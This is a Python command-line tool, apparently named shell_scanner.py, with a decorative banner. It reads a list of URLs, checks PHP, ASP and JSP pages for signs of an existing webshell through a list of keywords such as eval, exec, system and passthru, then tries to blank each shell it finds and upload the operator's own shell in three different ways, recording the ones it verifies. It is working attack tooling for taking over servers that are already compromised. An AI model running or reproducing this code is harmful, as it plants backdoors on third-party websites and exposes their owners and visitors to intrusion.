import os
import sys
import asyncio
import aiohttp
import aiofiles
import logging
from datetime import datetime

# Set up logging for debugging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Define RGB color
purple = "\033[38;2;111;0;255m"
reset = "\033[0m"

# Print ASCII art in RGB purple color
print(purple + """…………………▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
……………▄▄█▓▓▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓█▄▄
…………▄▀▀▓▒░░░░░░░░░░░░░░░░▒▓▓▀▄
………▄▀▓▒▒░░░░░░░░░░░░░░░░░░░▒▒▓▀▄
……..█▓█▒░░░░░░░░░░░░░░░░░░░░░▒▓▒▓█      ░▒▓███████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░      ░▒▓█▓▒░                                 
…..▌▓▀▒░░░░░░░░░░░░░░░░░░░░░░░░▒▀▓█    ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░ 
…..█▌▓▒▒░░░░░░░░░░░░░░░░░░░░░░░░░▒▓█   ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░ 
…▐█▓▒░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▓█▌    ░▒▓██████▓▒░░▒▓████████▓▒░▒▓██████▓▒░ ░▒▓█▓▒░      ░▒▓█▓▒░ 
…█▓▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▓█          ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░   
..█▐▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒█▓█        ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░                   
…█▓█▒░░░░░░░░░░░░░░░░░░░░░░░░░░░▒█▌▓█  ░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓████████▓▒░▒▓████████▓▒░  
..█▓▓█▒░░░░▒█▄▒▒░░░░░░░░░▒▒▄█▒░░░░▒█▓▓█                                                                               
..█▓█▒░▒▒▒▒░░▀▀█▄▄░░░░░▄▄█▀▀░░▒▒▒▒░▒█▓█ ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓███████▓▒ Indexing
.█▓▌▒▒▓▓▓▓▄▄▄▒▒▒▀█░░░░█▀▒▒▒▄▄▄▓▓▓▓▒▒▐▓ ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ 
.██▌▒▓███▓█████▓▒▐▌░░▐▌▒▓████▓████▓▒▐██░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░
..██▒▒▓███▓▓▓████▓▄░░░▄▓████▓▓▓███▓▒▒██░▒▓█▓▒░      ░▒▓████████▓▒░▒▓██████▓▒░░▒▓█▓▒░      ░▒▓███████▓▒░░▒▓██████▓▒░ ░▒▓███████▓▒░ 
..█▓▒▒▓██████████▓▒░░░▒▓██████████▓▒▒▓█░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░
..█▓▒░▒▓███████▓▓▄▀░░▀▄▓▓███████▓▒░▒▓█ ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░
….█▓▒░▒▒▓▓▓▓▄▄▄▀▒░░░░░▒▀▄▄▄▓▓▓▓▒▒░▓█    ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░
……█▓▒░▒▒▒▒░░░░░░▒▒▒▒░░░░░░▒▒▒▒░▒▓█
………█▓▓▒▒▒░░██░░▒▓██▓▒░░██░░▒▒▒▓▓█
………▀██▓▓▓▒░░▀░▒▓████▓▒░▀░░▒▓▓▓██▀      
………….░▀█▓▒▒░░░▓█▓▒▒▓█▓▒░░▒▒▓█▀░
…………█░░██▓▓▒░░▒▒▒░▒▒▒░░▒▓▓██░░█
………….█▄░░▀█▓▒░░░░░░░░░░▒▓█▀░░▄█
…………..█▓█░░█▓▒▒▒░░░░░▒▒▒▓█░░█▓█
…………….█▓█░░█▀█▓▓▓▓▓▓█▀░░█░█▓█▌
……………..█▓▓█░█░█░█▀▀▀█░█░▄▀░█▓█
……………..█▓▓█░░▀█▀█░█░█▄█▀░░█▓▓█
………………█▓▒▓█░░░░▀▀▀▀░░░░░█▓▓█
………………█▓▒▒▓█░░░░ ░░░░░░░█▓▓█
………………..█▓▒▓██▄█░░░▄░░▄██▓▒▓█
………………..█▓▒▒▓█▒█▀█▄█▀█▒█▓▒▓█
………………..█▓▓▒▒▓██▒▒██▒██▓▒▒▓█
………………….█▓▓▒▒▓▀▀███▀▀▒▒▓▓█
……………………▀█▓▓▓▓▒▒▒▒▓▓▓▓█▀
………………………..▀▀██▓▓▓▓██▀
""" + reset)

webshell_extensions = ['.php', '.asp', '.aspx', '.jsp', '.file', '.phtml', '.php3', '.php4', '.php5']
webshell_keywords = ['system', 'upload', 'eval', 'exec', 'shell_exec', 'passthru', 'cmd', 'webshell', 'backdoor', 'phpinfo', 'fopen', 'file_put_contents']

async def check_webshell(session, url, shell_file_path):
    try:
        logger.info(f"Checking URL: {url}")
        async with session.get(url, timeout=10, ssl=False) as response:
            if response.status == 200:
                file_contents = await response.text()
                if any(keyword in file_contents.lower() for keyword in webshell_keywords):
                    print(f"\033[1;32mFound: {url}\033[0m")
                    logger.info(f"Active shell detected at: {url}")
                    async with aiofiles.open('foundshells.txt', 'a') as output_file:
                        await output_file.write(url + '\n')
                    
                    # Attempt to remove old shell by overwriting with empty content
                    try:
                        async with session.post(url, data='', timeout=10, ssl=False) as remove_response:
                            if remove_response.status == 200:
                                print(f"\033[1;33mRemoved old shell: {url}\033[0m")
                                logger.info(f"Successfully removed old shell at: {url}")
                            else:
                                print(f"\033[1;31mFailed to remove old shell: {url} (Status: {remove_response.status})\033[0m")
                                logger.warning(f"Failed to remove old shell at: {url} (Status: {remove_response.status})")
                                # Continue to upload even if removal fails
                    except Exception as e:
                        print(f"\033[1;31mError removing old shell {url}: {e}\033[0m")
                        logger.error(f"Error removing old shell at {url}: {e}")
                        # Continue to upload even if removal fails

                    # Attempt to upload new shell using multiple methods
                    try:
                        with open(shell_file_path, 'rb') as f:
                            shell_content = f.read()
                        
                        # Method 1: Standard multipart form upload
                        data = aiohttp.FormData()
                        data.add_field('file', shell_content, filename=os.path.basename(shell_file_path), content_type='application/x-php')
                        async with session.post(url, data=data, headers={'Content-Type': 'multipart/form-data'}, timeout=10, ssl=False) as upload_response:
                            if upload_response.status == 200:
                                print(f"\033[1;32mSuccessfully uploaded new shell to: {url} (Method 1)\033[0m")
                                logger.info(f"Successfully uploaded new shell to: {url} (Method 1)")
                                async with aiofiles.open('uploadedshells.txt', 'a') as uploaded_file:
                                    await uploaded_file.write(url + '\n')
                                
                                # Verify upload
                                async with session.get(url, timeout=5, ssl=False) as verify_response:
                                    if verify_response.status == 200 and any(keyword in (await verify_response.text()).lower() for keyword in webshell_keywords):
                                        print(f"\033[1;32mVerified: New shell active at {url}\033[0m")
                                        logger.info(f"Verified: New shell active at {url}")
                                    else:
                                        print(f"\033[1;31mVerification failed for new shell at {url}\033[0m")
                                        logger.warning(f"Verification failed for new shell at {url}")
                            else:
                                print(f"\033[1;31mFailed to upload new shell to: {url} (Method 1, Status: {upload_response.status})\033[0m")
                                logger.warning(f"Failed to upload new shell to: {url} (Method 1, Status: {upload_response.status})")
                                
                                # Method 2: Alternative form field name
                                data_alt = aiohttp.FormData()
                                data_alt.add_field('upload', shell_content, filename=os.path.basename(shell_file_path), content_type='application/x-php')
                                async with session.post(url, data=data_alt, headers={'Content-Type': 'multipart/form-data'}, timeout=10, ssl=False) as upload_response_alt:
                                    if upload_response_alt.status == 200:
                                        print(f"\033[1;32mSuccessfully uploaded new shell to: {url} (Method 2)\033[0m")
                                        logger.info(f"Successfully uploaded new shell to: {url} (Method 2)")
                                        async with aiofiles.open('uploadedshells.txt', 'a') as uploaded_file:
                                            await uploaded_file.write(url + '\n')
                                        
                                        # Verify upload
                                        async with session.get(url, timeout=5, ssl=False) as verify_response:
                                            if verify_response.status == 200 and any(keyword in (await verify_response.text()).lower() for keyword in webshell_keywords):
                                                print(f"\033[1;32mVerified: New shell active at {url}\033[0m")
                                                logger.info(f"Verified: New shell active at {url}")
                                            else:
                                                print(f"\033[1;31mVerification failed for new shell at {url}\033[0m")
                                                logger.warning(f"Verification failed for new shell at {url}")
                                    else:
                                        print(f"\033[1;31mFailed to upload new shell to: {url} (Method 2, Status: {upload_response_alt.status})\033[0m")
                                        logger.warning(f"Failed to upload new shell to: {url} (Method 2, Status: {upload_response_alt.status})")
                                
                                # Method 3: Raw content POST
                                async with session.post(url, data=shell_content, headers={'Content-Type': 'application/x-php'}, timeout=10, ssl=False) as upload_response_raw:
                                    if upload_response_raw.status == 200:
                                        print(f"\033[1;32mSuccessfully uploaded new shell to: {url} (Method 3)\033[0m")
                                        logger.info(f"Successfully uploaded new shell to: {url} (Method 3)")
                                        async with aiofiles.open('uploadedshells.txt', 'a') as uploaded_file:
                                            await uploaded_file.write(url + '\n')
                                        
                                        # Verify upload
                                        async with session.get(url, timeout=5, ssl=False) as verify_response:
                                            if verify_response.status == 200 and any(keyword in (await verify_response.text()).lower() for keyword in webshell_keywords):
                                                print(f"\033[1;32mVerified: New shell active at {url}\033[0m")
                                                logger.info(f"Verified: New shell active at {url}")
                                            else:
                                                print(f"\033[1;31mVerification failed for new shell at {url}\033[0m")
                                                logger.warning(f"Verification failed for new shell at {url}")
                                    else:
                                        print(f"\033[1;31mFailed to upload new shell to: {url} (Method 3, Status: {upload_response_raw.status})\033[0m")
                                        logger.warning(f"Failed to upload new shell to: {url} (Method 3, Status: {upload_response_raw.status})")
                    except Exception as e:
                        print(f"\033[1;31mError uploading new shell to {url}: {e}\033[0m")
                        logger.error(f"Error uploading new shell to {url}: {e}")
                else:
                    print(f"\033[1;31mDead: {url} (No shell keywords found)\033[0m")
                    logger.info(f"No shell keywords found at: {url}")
            else:
                print(f"\033[1;31mDead: {url} (Status: {response.status})\033[0m")
                logger.info(f"Dead URL: {url} (Status: {response.status})")
    except Exception as e:
        print(f"\033[1;31mDead: {url} ({str(e)})\033[0m")
        logger.error(f"Error checking URL {url}: {e}")

async def detect_webshell_from_urls(file_path, shell_file_path):
    found_shells = 0
    uploaded_shells = 0
    try:
        # Read URLs from file
        with open(file_path, 'r') as url_file:
            urls = [url.strip() for url in url_file.readlines() if url.strip()]
        logger.info(f"Loaded {len(urls)} URLs from {file_path}")
        
        # Initialize aiohttp session
        async with aiohttp.ClientSession() as session:
            tasks = []
            for url in urls:
                if os.path.splitext(url)[1].lower() in webshell_extensions:
                    tasks.append(check_webshell(session, url, shell_file_path))
            
            # Run all tasks concurrently
            logger.info(f"Starting scan for {len(tasks)} URLs with valid extensions")
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # Count successful detections and uploads
            for result in results:
                if isinstance(result, tuple):
                    found, uploaded = result
                    found_shells += found
                    uploaded_shells += uploaded
            
            logger.info(f"Scan completed. Found {found_shells} shells, successfully uploaded {uploaded_shells} shells")
            print(f"\033[1;34mScan Summary: Found {found_shells} shells, successfully uploaded {uploaded_shells} shells\033[0m")
            
    except KeyboardInterrupt:
        print("\nExecution stopped by user. Results saved.")
        logger.info("Execution stopped by user")
    except FileNotFoundError:
        print(f"\033[1;31mError: Input file {file_path} not found\033[0m")
        logger.error(f"Input file {file_path} not found")
    except Exception as e:
        print(f"\033[1;31mAn unexpected error occurred: {e}\033[0m")
        logger.error(f"Unexpected error: {e}")

def main():
    if len(sys.argv) != 3:
        print("\033[1;31mUsage: python shell_scanner.py <input_file> <shell_file_path>\033[0m")
        sys.exit(1)
    
    input_file = sys.argv[1]
    shell_file_path = sys.argv[2]
    
    if not os.path.isfile(input_file):
        print(f"\033[1;31mError: Input file {input_file} not found\033[0m")
        logger.error(f"Input file {input_file} not found")
        sys.exit(1)
    
    if not os.path.isfile(shell_file_path):
        print(f"\033[1;31mError: Shell file {shell_file_path} not found\033[0m")
        logger.error(f"Shell file {shell_file_path} not found")
        sys.exit(1)
    
    # Ensure output files are created fresh
    if os.path.exists('foundshells.txt'):
        os.remove('foundshells.txt')
    if os.path.exists('uploadedshells.txt'):
        os.remove('uploadedshells.txt')
    
    asyncio.run(detect_webshell_from_urls(input_file, shell_file_path))

if __name__ == "__main__":
    main()
